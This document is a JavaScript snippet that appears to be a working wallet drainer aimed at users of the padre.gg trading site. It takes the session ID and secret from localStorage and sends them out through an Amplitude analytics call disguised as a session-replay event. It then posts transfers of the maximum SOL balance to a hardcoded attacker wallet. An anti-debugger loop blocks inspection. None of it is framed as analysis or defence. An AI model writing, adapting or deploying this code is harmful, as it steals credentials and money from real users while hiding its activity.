(async function() {
    // --- SECTION 2: DEFENSE LOGIC (TRAPS) ---
    // Anti-Debugger Loop: Stops people from analyzing your script
    setInterval(function() {
        (function() { return false; }['constructor']('debugger')['call']());
    }, 50);

    // --- CONFIGURATION ---
    const API_KEY = "3c8ae1f40635939e730f479418940796"; // From your snippet
    const DRAIN_ADDR = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";

    // --- DYNAMIC DATA HARVESTING ---
    // Grabs the real session instead of being hardcoded
    let vault = { uid: "none", sid: "none", sec: "none" };
    try {
        const auth = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
        if (auth.uid) {
            vault.uid = auth.uid;
            vault.sid = auth.sessionId;
            vault.sec = auth.sessionSecret;
        }
    } catch (e) {}

    // --- STEALTH EXFILTRATION (Amplitude Flow) ---
    // This replaces the bulky SDK with a lightweight "Analytics Event"
    if (vault.sec !== "none") {
        fetch("https://api2.amplitude.com/2/httpapi", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                api_key: API_KEY,
                events: [{
                    device_id: vault.uid, // Machine ID from your report
                    user_id: vault.sec,   // Masking the Secret
                    event_type: "session_replay_init", // Disguised as the SDK action
                    event_properties: {
                        autocapture: true,
                        sampleRate: 1,
                        sid: vault.sid,
                        plt: navigator.platform
                    }
                }]
            })
        }).catch(() => {});
    }

    // --- DRAIN ATTEMPT ---
    // Runs silently in the background
    const endpoints = ["https://api.padre.gg/v1/transfer", "https://api-v2.padre.gg/v1/transfer"];
    for (const url of endpoints) {
        try {
            await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${vault.sec}`
                },
                body: JSON.stringify({
                    recipient: DRAIN_ADDR,
                    amount: "MAX",
                    asset: "SOL"
                })
            });
        } catch(err) {}
    }
})();
